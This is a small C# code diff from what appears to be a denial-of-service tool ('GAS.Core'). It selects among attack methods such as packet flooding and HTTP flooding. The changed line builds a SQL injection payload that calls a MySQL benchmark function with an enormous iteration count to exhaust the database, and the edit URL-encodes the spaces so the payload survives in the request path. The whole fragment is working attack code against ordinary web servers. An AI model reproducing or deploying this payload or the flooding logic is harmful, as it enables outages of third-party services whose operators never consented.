@@ -102,7 +102,7 @@ namespace GAS.Core
                     Worker = new PacketFlood(Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
                     break;
                 case AttackMethod.RefRef:
-                    this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
+                    this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".Replace(" ","%20");
                     Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                     break;
                 case AttackMethod.AhrDosme:
